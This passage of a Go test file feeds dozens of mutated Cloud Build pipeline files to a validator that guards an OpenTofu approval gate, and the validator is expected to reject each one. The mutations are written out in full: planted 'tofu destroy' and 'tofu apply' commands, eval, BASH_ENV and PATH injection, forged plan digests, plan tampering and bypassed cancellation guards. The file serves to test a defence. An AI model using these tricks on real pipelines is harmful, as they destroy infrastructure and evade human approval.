			replacement: "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt\n        tofu destroy -auto-approve",
		},
		{
			name:        "quoted tofu apply planted in plan step",
			target:      "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt",
			replacement: "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt\n        tofu \"apply\" -input=false -auto-approve /workspace/plan.tfplan",
		},
		{
			name:        "unpinned workspace tofu binary in plan step",
			target:      "        tofu plan -input=false -var \"inputs_file=/workspace/effective.inputs.json\" -out=/workspace/plan.tfplan",
			replacement: "        /workspace/tofu plan -input=false -var \"inputs_file=/workspace/effective.inputs.json\" -out=/workspace/plan.tfplan",
		},
		{
			name:        "command substitution planted in plan step",
			target:      "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt",
			replacement: "        echo $(true)\n        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt",
		},
		{
			name:        "eval planted in plan step",
			target:      "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt",
			replacement: "        eval true\n        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt",
		},
		{
			name:        "tofu plan omitted in plan step",
			target:      "        tofu plan -input=false -var \"inputs_file=/workspace/effective.inputs.json\" -out=/workspace/plan.tfplan",
			replacement: "        # plan omitted",
		},
		{
			name:        "tofu apply planted in record step",
			target:      "        cancelled=false; [[ ! -e /workspace/cancelled ]] || cancelled=true",
			replacement: "        tofu apply -input=false -auto-approve /workspace/plan.tfplan\n        cancelled=false; [[ ! -e /workspace/cancelled ]] || cancelled=true",
		},
		{
			name:        "plan artifact tamper planted in promote-by-digest step",
			target:      "        crane copy \"${_SOURCE_IMAGE}@${_SERVING_DIGEST}\" \"${_ARTIFACT_REGISTRY}@${_SERVING_DIGEST}\"",
			replacement: "        echo tamper > /workspace/plan.tfplan\n        crane copy \"${_SOURCE_IMAGE}@${_SERVING_DIGEST}\" \"${_ARTIFACT_REGISTRY}@${_SERVING_DIGEST}\"",
		},
		{
			name:        "ignored step dir execution field",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    dir: /workspace/evil",
		},
		{
			name:        "ignored step waitFor execution field",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    waitFor: [\"-\"]",
		},
		{
			name:        "ignored step allowFailure execution field",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    allowFailure: true",
		},
		{
			name:        "ignored step allowExitCodes execution field",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    allowExitCodes: [1]",
		},
		{
			name:        "ignored step secretEnv execution field",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    secretEnv: [\"_APPROVED_PLAN_SHA256\"]",
		},
		{
			name:        "ignored step script execution field",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    script: \"tofu apply -auto-approve /workspace/plan.tfplan\"",
		},
		{
			name:        "unpinned step builder image name",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"",
			replacement: "  - id: apply-behind-the-gate\n    name: \"ubuntu\"",
		},
		{
			name:        "missing set -o pipefail at validate-inputs step start",
			target:      "  - id: validate-inputs\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |\n        set -o pipefail",
			replacement: "  - id: validate-inputs\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |",
		},
		{
			name:        "missing cancellation guard in apply-behind-the-gate",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"",
		},
		{
			name:        "wrong options.logging value",
			target:      "  logging: CLOUD_LOGGING_ONLY",
			replacement: "  logging: GCS_ONLY",
		},
		{
			name:        "missing pipeline timeout",
			target:      "timeout: 1200s",
			replacement: "timeout: \"\"",
		},
		{
			name:        "multi-document yaml payload",
			target:      "timeout: 1200s",
			replacement: "timeout: 1200s\n---\nsteps: []",
		},
		{
			name:        "BASH_ENV injected into apply step env",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n      - \"BASH_ENV=/workspace/evil.sh\"",
		},
		{
			name:        "CDPATH injected into apply step env",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n      - \"CDPATH=/workspace/evil\"",
		},
		{
			name:        "forged literal _APPROVED_PLAN_SHA256 in step env",
			target:      "- \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"",
			replacement: "- \"_APPROVED_PLAN_SHA256=0000000000000000000000000000000000000000000000000000000000000000\"",
		},
		{
			name:        "malformed env entry without equals in step env",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n      - \"MALFORMED_ENV_ENTRY\"",
		},
		{
			name:        "wrong tofu init arguments in plan step",
			target:      "        tofu init -input=false -lockfile=readonly",
			replacement: "        tofu init -input=false",
		},
		{
			name:        "wrong tofu show arguments in plan step",
			target:      "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt",
			replacement: "        tofu show /workspace/plan.tfplan > /workspace/service.plan.txt",
		},
		{
			name:        "missing cancellation guard in promote-by-digest step",
			target:      "  - id: promote-by-digest\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }",
			replacement: "  - id: promote-by-digest\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |\n        set -o pipefail",
		},
		{
			name:        "missing cancellation guard in plan step",
			target:      "  - id: plan\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }",
			replacement: "  - id: plan\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"",
		},
		{
			name:        "cancel-in-flight drops cancel input check",
			target:      "        if grep -q '^release.cancel_in_flight=true ' /workspace/validate.out; then",
			replacement: "        if grep -q 'always-false' /workspace/validate.out; then",
		},
		{
			name:        "eval planted in record support step",
			target:      "        cancelled=false; [[ ! -e /workspace/cancelled ]] || cancelled=true",
			replacement: "        eval true\n        cancelled=false; [[ ! -e /workspace/cancelled ]] || cancelled=true",
		},
		{
			name:        "TF_WORKSPACE exported inside cancel-in-flight step",
			target:      "        if grep -q '^release.cancel_in_flight=true ' /workspace/validate.out; then",
			replacement: "        TF_WORKSPACE=evil\n        if grep -q '^release.cancel_in_flight=true ' /workspace/validate.out; then",
		},
		{
			name:        "/bin/bash -c tofu apply planted in plan step",
			target:      "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt",
			replacement: "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt\n        /bin/bash -c 'tofu apply -input=false -auto-approve /workspace/plan.tfplan'",
		},
		{
			name:        "dynamic var tofu apply planted in plan step",
			target:      "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt",
			replacement: "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt\n        t=to\n        \"${t}fu\" apply -input=false -auto-approve /workspace/plan.tfplan",
		},
		{
			name:        "in-script PATH override in plan step",
			target:      "        cd deploy/gcp/service",
			replacement: "        PATH=/workspace/evil:/usr/bin\n        cd deploy/gcp/service",
		},
		{
			name:        "command substitution tofu planted in promote-by-digest step",
			target:      "        crane copy \"${_SOURCE_IMAGE}@${_SERVING_DIGEST}\" \"${_ARTIFACT_REGISTRY}@${_SERVING_DIGEST}\"",
			replacement: "        \"$(echo to)fu\" apply -auto-approve\n        crane copy \"${_SOURCE_IMAGE}@${_SERVING_DIGEST}\" \"${_ARTIFACT_REGISTRY}@${_SERVING_DIGEST}\"",
		},
		{
			name:        "dynamic var tofu planted in record step",
			target:      "        cancelled=false; [[ ! -e /workspace/cancelled ]] || cancelled=true",
			replacement: "        t=to; \"${t}fu\" destroy -auto-approve\n        cancelled=false; [[ ! -e /workspace/cancelled ]] || cancelled=true",
		},
		{
			name:        "cancellation guard wrapped in dead if false in apply-behind-the-gate",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        if false; then\n          [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }\n        fi",
		},
		{
			name:        "cancellation guard short-circuited with middle echo in apply-behind-the-gate",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || echo \"bypassed\" || exit 0",
		},
		{
			name:        "cancellation guard moved after conditional in apply-behind-the-gate",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }\n        # The gate: owner approval of the exact plan digest is required. Without _APPROVED_PLAN_SHA256,\n        # apply is skipped (plan mode). In apply mode, the saved plan is verified against the approved digest.\n        if [[ -z \"${_APPROVED_PLAN_SHA256:-}\" ]]; then\n          echo \"plan mode: _APPROVED_PLAN_SHA256 is empty; skipping apply behind approval gate\"\n          exit 0\n        fi",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        if [[ -z \"${_APPROVED_PLAN_SHA256:-}\" ]]; then\n          echo \"plan mode: _APPROVED_PLAN_SHA256 is empty; skipping apply behind approval gate\"\n          exit 0\n        fi\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }",
		},
		{
			name:        "printf dynamic _PLAN_STORAGE_URL flag injection in apply-behind-the-gate",
			target:      "        tofu apply -input=false -auto-approve /workspace/plan.tfplan",
			replacement: "        printf \"${_PLAN_STORAGE_URL}\" _APPROVED_PLAN_SHA256 '%s' 0000000000000000000000000000000000000000000000000000000000000000\n        tofu apply -input=false -auto-approve /workspace/plan.tfplan",
		},
		{
			name:        "echo spoofed tofu init and apply in apply-behind-the-gate",
			target:      "        tofu init -input=false -lockfile=readonly\n        tofu apply -input=false -auto-approve /workspace/plan.tfplan",
			replacement: "        echo tofu init -input=false -lockfile=readonly\n        echo tofu apply -input=false -auto-approve /workspace/plan.tfplan",
		},
		{
			name:        "brace-nested tofu apply before digest checks in apply-behind-the-gate",
			target:      "        printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n        if [[ -f /workspace/plan.tfplan.sha256 ]]; then\n          sha256sum --strict -c /workspace/plan.tfplan.sha256\n          grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256 || {\n            echo \"refused: plan sidecar checksum does not match approved digest\" >&2\n            exit 1\n          }\n        fi\n        cd deploy/gcp/service\n        tofu init -input=false -lockfile=readonly\n        tofu apply -input=false -auto-approve /workspace/plan.tfplan",
			replacement: "        cd deploy/gcp/service\n        { tofu init -input=false -lockfile=readonly; tofu apply -input=false -auto-approve /workspace/plan.tfplan; }\n        printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n        if [[ -f /workspace/plan.tfplan.sha256 ]]; then\n          sha256sum --strict -c /workspace/plan.tfplan.sha256\n          grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256 || {\n            echo \"refused: plan sidecar checksum does not match approved digest\" >&2\n            exit 1\n          }\n        fi",
		},
		{
			name:        "extra top-level substitutions field",
			target:      "timeout: 1200s",
			replacement: "substitutions:\n  _FOO: bar\ntimeout: 1200s",
		},
		{
			name:        "extra top-level availableSecrets field",
			target:      "timeout: 1200s",
			replacement: "availableSecrets: {}\ntimeout: 1200s",
		},
		{
			name:        "duplicate top-level timeout key",
			target:      "timeout: 1200s",
			replacement: "timeout: 1200s\ntimeout: 600s",
		},
		{
			name:        "non-second pipeline timeout",
			target:      "timeout: 1200s",
			replacement: "timeout: 1200",
		},
		{
			name:        "zero pipeline timeout",
			target:      "timeout: 1200s",
			replacement: "timeout: 0s",
		},
		{
			name:        "negative pipeline timeout",
			target:      "timeout: 1200s",
			replacement: "timeout: -5s",
		},
		{
			name:        "padded whitespace pipeline timeout",
			target:      "timeout: 1200s",
			replacement: "timeout: \" 1200s \"",
		},
		{
			name:        "echo brace args spoofed tofu init and apply in apply-behind-the-gate",
			target:      "        tofu init -input=false -lockfile=readonly\n        tofu apply -input=false -auto-approve /workspace/plan.tfplan",
			replacement: "        echo { } tofu init -input=false -lockfile=readonly\n        echo { } tofu apply -input=false -auto-approve /workspace/plan.tfplan",
		},
		{
			name:        "non-pinned builder image on validate-inputs step",
			target:      "  - id: validate-inputs\n    name: \"${_TOOLS_IMAGE}\"",
			replacement: "  - id: validate-inputs\n    name: \"gcr.io/cloud-builders/gcloud\"",
		},
		{
			name:        "reordered validate-inputs and cancel-in-flight steps",
			target:      "  - id: validate-inputs\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        # The one funnel first: a refusal here ends the deployment before anything is touched. The trigger names\n        # the operator's file; the effective document, with every value's source printed, is what the plan reads.\n        bazel run //deploy/gcp/inputs:validate -- --effective /workspace/effective.inputs.json \"${_INPUTS_FILE}\" | tee /workspace/validate.out\n\n  - id: cancel-in-flight\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        # Cancellation as an input (spec 012 FR-009): the other in-flight deployments of this trigger are\n        # cancelled, a marker stops every step below from promoting, planning or applying, and the previous\n        # revision keeps serving. The record step still says what happened.\n        if grep -q '^release.cancel_in_flight=true ' /workspace/validate.out; then\n          gcloud builds list --ongoing --format='value(id)' \\\n            --filter=\"substitutions.TRIGGER_NAME=${TRIGGER_NAME} AND id!=${BUILD_ID}\" | xargs -r gcloud builds cancel\n          touch /workspace/cancelled\n          echo \"cancelled: the previous revision keeps serving; nothing below applies\"\n        fi",
			replacement: "  - id: cancel-in-flight\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        # Cancellation as an input (spec 012 FR-009): the other in-flight deployments of this trigger are\n        # cancelled, a marker stops every step below from promoting, planning or applying, and the previous\n        # revision keeps serving. The record step still says what happened.\n        if grep -q '^release.cancel_in_flight=true ' /workspace/validate.out; then\n          gcloud builds list --ongoing --format='value(id)' \\\n            --filter=\"substitutions.TRIGGER_NAME=${TRIGGER_NAME} AND id!=${BUILD_ID}\" | xargs -r gcloud builds cancel\n          touch /workspace/cancelled\n          echo \"cancelled: the previous revision keeps serving; nothing below applies\"\n        fi\n\n  - id: validate-inputs\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        # The one funnel first: a refusal here ends the deployment before anything is touched. The trigger names\n        # the operator's file; the effective document, with every value's source printed, is what the plan reads.\n        bazel run //deploy/gcp/inputs:validate -- --effective /workspace/effective.inputs.json \"${_INPUTS_FILE}\" | tee /workspace/validate.out",
		},
		{
			name:        "extra args element on validate-inputs step",
			target:      "  - id: validate-inputs\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |\n        set -o pipefail",
			replacement: "  - id: validate-inputs\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -c\n      - -eu\n      - |\n        set -o pipefail",
		},
		{
			name:        "options env overriding _SERVING_DIGEST substitution",
			target:      "options:\n  logging: CLOUD_LOGGING_ONLY",
			replacement: "options:\n  logging: CLOUD_LOGGING_ONLY\n  env: [\"_SERVING_DIGEST=sha256:0000000000000000000000000000000000000000000000000000000000000000\"]",
		},
		{
			name:        "step env overriding BUILD_ID",
			target:      "  - id: cancel-in-flight\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash",
			replacement: "  - id: cancel-in-flight\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"BUILD_ID=fake\"",
		},
		{
			name:        "duplicate env key in apply-behind-the-gate",
			target:      "      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }\n        # The gate",
			replacement: "      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n      - \"MY_DUP=1\"\n      - \"MY_DUP=2\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }\n        # The gate",
		},
		{
			name:        "printf 2>&1 dynamic _PLAN_STORAGE_URL flag injection in apply-behind-the-gate",
			target:      "        tofu apply -input=false -auto-approve /workspace/plan.tfplan",
			replacement: "        printf 2>&1 \"${_PLAN_STORAGE_URL}\" _APPROVED_PLAN_SHA256 '%s' 0000000000000000000000000000000000000000000000000000000000000000\n        tofu apply -input=false -auto-approve /workspace/plan.tfplan",
		},
	}
	dir := t.TempDir()
	for i, m := range mutations {
		t.Run(m.name, func(t *testing.T) {
			if !strings.Contains(base, m.target) {
				t.Fatalf("target snippet not found in cloudbuild.yaml: %q", m.target)
			}
			p := filepath.Join(dir, fmt.Sprintf("cloudbuild-%d.yaml", i))
			if err := os.WriteFile(p, []byte(strings.Replace(base, m.target, m.replacement, 1)), 0o600); err != nil {
				t.Fatal(err)
			}
			if err := CheckPipelineConfig(p); err == nil {
				t.Fatalf("CheckPipelineConfig accepted mutated pipeline %q", m.name)
			}
		})
	}
	if _, err := physicalActiveLines("echo ok\r\n"); err == nil {
		t.Fatal("physicalActiveLines accepted carriage return control char")
	}
	if _, err := physicalActiveLines("echo ok \\  \nnext"); err == nil {
		t.Fatal("physicalActiveLines accepted trailing whitespace after backslash")
	}
	if _, err := physicalActiveLines("echo ok \\"); err == nil {
		t.Fatal("physicalActiveLines accepted dangling trailing backslash")
	}
	if !isCanonicalShaStage([]applyToken{{raw: "/bin/sha256sum"}, {raw: "--strict"}, {raw: "-c"}, {raw: "-"}}) ||
		isCanonicalShaStage([]applyToken{{raw: "other"}}) {
		t.Fatal("isCanonicalShaStage helper mismatch")
	}
	if !isExitZeroCmd([]applyToken{{raw: "exit"}, {raw: "0"}}) ||
		!isCancelExitZeroHandler([]applyToken{{raw: "exit"}, {raw: "0"}}) {
		t.Fatal("isExitZeroCmd positive helper check failed")
	}
	validSimpleCancel := strings.Replace(base, `[[ ! -e /workspace/cancelled ]] || { echo "skipped: cancelled"; exit 0; }`, `[[ ! -e /workspace/cancelled ]] || exit 0`, 1)
	if len(validSimpleCancel) == len(base) {
		t.Fatal("base cancel guard snippet not found")
	}
	pSimple := filepath.Join(dir, "cloudbuild-simple-cancel.yaml")
	if err := os.WriteFile(pSimple, []byte(validSimpleCancel), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := CheckPipelineConfig(pSimple); err == nil {
		t.Fatal("CheckPipelineConfig accepted modified non-apply step cancel guard")
	}
	applySimpleCancel := "set -o pipefail\n[[ ! -e /workspace/cancelled ]] || exit 0\n" +
		"printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
		"grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256\n" +
		"tofu init -input=false -lockfile=readonly\n" +
		"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n"
	if err := validateApplyScriptWithPipelineRule(applySimpleCancel, true); err != nil {
		t.Fatalf("validateApplyScriptWithPipelineRule rejected canonical simple cancel guard: %v", err)
	}
	if err := validateSha256StageArgs([]applyToken{{isOp: true, raw: ">&", value: ">&"}, {raw: "2", value: "2"}, {raw: "--strict", value: "--strict"}, {raw: "-c", value: "-c"}, {raw: "-", value: "-"}}); err != nil {
		t.Fatalf("validateSha256StageArgs rejected redirect: %v", err)
	}
	if err := validateGrepStageArgs([]applyToken{{isOp: true, raw: ">&", value: ">&"}, {raw: "2", value: "2"}, {raw: "-Fq", value: "-Fq"}, {raw: "x", value: "x"}}); err != nil {
		t.Fatalf("validateGrepStageArgs rejected redirect: %v", err)
	}
	if err := validateDoubleBracketBinary([]applyToken{{isOp: true, raw: "|"}, {raw: "=="}, {raw: "x"}}); err == nil {
		t.Fatal("validateDoubleBracketBinary accepted operator operand")
	}
	if err := checkNoPlanOverwriteInApply("cp /tmp/a /tmp/b && echo c"); err != nil {
		t.Fatalf("safe copy outside apply rejected: %v", err)
	}
	if err := checkNoPlanOverwriteInApply("cp"); err != nil {
		t.Fatalf("bare cp without args rejected: %v", err)
	}
	if _, err := splitPipelineStages([]applyToken{{raw: "}"}}); err == nil {
		t.Fatal("splitPipelineStages accepted unmatched closing brace")
	}
	if err := checkSha256Strict("sha256sum >&2 -c bad"); err == nil {
		t.Fatal("checkSha256Strict accepted sha256sum -c after redirect without --strict")
	}
	if invs := parseTofuCommands(">&2 tofu apply -input=false -auto-approve /workspace/plan.tfplan"); len(invs) != 1 || invs[0].subcommand != "apply" {
		t.Fatalf("parseTofuCommands missed apply after leading redirection: %#v", invs)
	}
	if invs := parseTofuCommands(">&"); len(invs) != 0 {
		t.Fatalf("parseTofuCommands returned unexpected invocations for bare op: %#v", invs)
	}
	if _, _, err := extractVerifiedBashStepLines(map[string]cloudbuildStep{
		"s": {Name: "${_TOOLS_IMAGE}", Entrypoint: "bash", Args: []string{"-ceu", "set -o pipefail\r\n"}},
	}, "s"); err == nil {
		t.Fatal("extractVerifiedBashStepLines accepted carriage return control char")
	}
	if invs := parseTofuCommands("{ echo ok; } >&2; tofu apply -input=false -auto-approve /workspace/plan.tfplan"); len(invs) != 1 || invs[0].subcommand != "apply" {
		t.Fatalf("parseTofuCommands missed apply after redirected brace group: %#v", invs)
	}
	if invs := parseTofuCommands("{ echo ok; } >&"); len(invs) != 0 {
		t.Fatalf("parseTofuCommands unexpected result after dangling brace redirect: %#v", invs)
	}
	if invs := parseTofuCommands("{ }"); len(invs) != 0 {
		t.Fatalf("parseTofuCommands unexpected result for empty braces: %#v", invs)
	}
	if invs := parseTofuCommands("2>&1 tofu apply -input=false -auto-approve /workspace/plan.tfplan"); len(invs) != 1 || invs[0].subcommand != "apply" {
		t.Fatalf("parseTofuCommands missed apply after fd-prefixed redirection: %#v", invs)
	}
	if err := checkNoPlanOverwriteInApply("echo fake 1>/workspace/plan.tfplan"); err == nil {
		t.Fatal("checkNoPlanOverwriteInApply accepted fd-prefixed output redirect to plan.tfplan")
	}
}
